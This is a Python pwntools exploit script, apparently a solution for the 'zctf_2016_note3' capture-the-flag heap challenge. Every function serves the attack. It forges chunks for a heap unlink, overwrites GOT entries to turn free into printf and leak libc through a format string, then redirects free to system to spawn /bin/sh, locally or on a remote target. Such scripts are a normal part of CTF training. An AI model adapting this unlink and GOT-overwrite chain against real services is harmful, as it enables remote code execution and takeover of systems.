from pwn import *
context(os='linux', arch='i386', kernel='amd64')

fname = args.FNAME if args.FNAME else 'zctf_2016_note3'
libname = args.LIB if args.LIB else '/lib/x86_64-linux-gnu/libc.so.6'
ldname = args.LDSO if args.LDSO else '/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2'
exe = ELF(fname)
libc = ELF(libname)
ldso = ELF(ldname)
context.binary = exe

if args.REMOTE:
    host, port = args.REMOTE.split(':')
    io = remote(host, int(port))
elif args.LDSO:
    io = process([ldname, fname], env={'LD_PRELOAD': libname})
elif args.LIB:
    io = process(fname, env={'LD_PRELOAD': libname})
else:
    io = process(fname)

def bpt():
    if not args.REMOTE:
        gdb.attach(io)
    pause()

s,sl,sa,sla = io.send, io.sendline, io.sendafter, io.sendlineafter
r, ra, rl, ru = io.recv, io.recvall, io.recvline, io.recvuntil

def opt(idx):
    sla(b'option--->>', str(idx).encode())

def create(sz, content):
    opt(1)
    sla(b'1024)', str(sz).encode())
    if (sz > len(content) + 1):
        sla(b'content:', content)
    else:
        sa(b'content:', content)

def edit(idx, content):
    opt(3)
    sla(b'note:', str(idx).encode())
    sla(b'content:', content)

def show():
    opt(2)

def delete(idx):
    opt(4)
    sla(b'note:', str(idx).encode())

def exp():
    [create(0x80, b'%11$#llx'*10) for _ in range(3)]
     
    addr_global_tbl = 0x6020C8
    fake_chunk_ptr = addr_global_tbl + 3*8
    fake_fd = fake_chunk_ptr - 0x18
    fake_bk = fake_chunk_ptr - 0x10
    payload_unlink = flat({
        0x8:    0xa0,
        0x10:   fake_fd,
        0x18:   fake_bk,
    })
    create(0x80, payload_unlink)    # chunk3
    create(0, b'\n')                # chunk4
    create(0x80, b'5')              # chunk5
    create(0x80, '6.guard')         # chunk6
    
    delete(4)
    payload_overwrite_chunk5_prevsize_and_size = flat({0x10:[0xa0, 0x90]}) + b'\n'
    create(0, payload_overwrite_chunk5_prevsize_and_size)
    delete(5) # trigger unlink

    # free@got = printf@plt, puts@got=printf@plt
    edit(3, p64(exe.got.free))
    edit(0, p64(exe.plt.printf)*2)

    delete(2)   # leak
    libc.address = int(r(14), 16) - 0x20830 # this offset is OS-relative
    log.success('libc: %#x' % libc.address)

    # free -> system, puts@got = puts
    edit(0, flat(libc.sym.system, libc.sym.puts))
    edit(1, '/bin/sh')
    delete(1)

if '__main__' == __name__:
    if args.DEBUG:
        context.log_level='debug'
    exp()
    io.interactive()